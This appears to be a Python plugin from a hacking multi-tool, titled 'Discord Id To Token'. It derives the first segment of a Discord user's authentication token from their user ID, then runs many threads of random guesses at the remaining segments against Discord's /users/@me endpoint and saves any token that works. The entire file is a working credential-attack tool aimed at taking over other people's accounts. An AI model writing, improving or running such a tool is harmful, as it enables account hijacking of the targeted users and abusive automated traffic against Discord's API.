# Copyright (c) 2026 v4lkyr0
# See LICENSE file for details

from Plugins.Utils import *
from Plugins.Config import *

try:
    import base64
    import random
    import requests
    import string
    import threading
    import time
except Exception as e:
    MissingModule(e)

Title("Discord Id To Token")
Connection()

try:
    user_id = input(f"{INPUT} Enter User Id {red}->{reset} ").strip()
    if not user_id.isdigit():
        ErrorId()

    first_part = base64.b64encode(user_id.encode("utf-8")).decode("utf-8").replace("=", "")
    print(f"{INFO} First Part of Token:{red} {first_part}", reset)

    find_token = input(f"{INPUT} Find the Token? {YESORNO} {red}->{reset} ").strip().lower()
    if find_token not in ['y', 'yes']:
        Continue()
        Reset()

    try:
        threads_number = int(input(f"{INPUT} Threads Number {red}->{reset} ").strip())
    except:
        ErrorNumber()

    print(f"{LOADING} Brute Force of the Token..", reset)

    token_found = threading.Event()
    found_token = [None]

    def TokenCheck():
        if token_found.is_set():
            return

        TOKEN_CHARS = string.ascii_letters + string.digits + '-_'
        second_part_token = ''.join(random.choice(TOKEN_CHARS) for _ in range(6))
        third_part_token  = ''.join(random.choice(TOKEN_CHARS) for _ in range(38))
        all_parts_token   = f"{first_part}.{second_part_token}.{third_part_token}"

        try:
            response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': all_parts_token, 'Content-Type': 'application/json'})
            if response.status_code == 200:
                found_token[0] = all_parts_token
                token_found.set()
                print(f"{SUCCESS} Status:{red} Valid   {white}| Token:{red} {all_parts_token}", reset)
            else:
                print(f"{ERROR} Status:{red} Invalid {white}| Token:{red} {all_parts_token}", reset)
        except:
            print(f"{ERROR} Status:{red} Error   {white}| Token:{red} {all_parts_token}", reset)

    def Request():
        threads = []
        try:
            for _ in range(threads_number):
                if token_found.is_set():
                    break
                t = threading.Thread(target=TokenCheck)
                t.start()
                threads.append(t)
                time.sleep(0.1)
        except:
            ErrorNumber()
        for thread in threads:
            thread.join()

    while not token_found.is_set():
        Request()

    if found_token[0]:
        SaveToken(found_token[0])
        print(f'{INFO} Token saved in {red}"{white}Programs/Extras/Buildware.json{red}"{white}.', reset)

    Continue()
    Reset()

except Exception as e:
    Error(e)